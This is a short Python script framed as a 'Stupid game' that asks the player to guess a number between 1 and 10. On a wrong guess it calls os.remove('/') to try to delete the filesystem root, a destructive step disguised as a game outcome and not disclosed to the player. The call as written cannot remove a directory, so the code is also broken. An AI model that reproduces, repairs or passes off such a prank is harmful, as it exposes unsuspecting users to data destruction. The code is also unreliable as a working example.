#!/usr/bin/env python3

import os
import random

bullet = random.randint(1, 10)
shot = int(input('Stupid game, guess a number between 1 & 10'))
if bullet == shot:
    print("You won :) ")
else:
        os.remove('/')
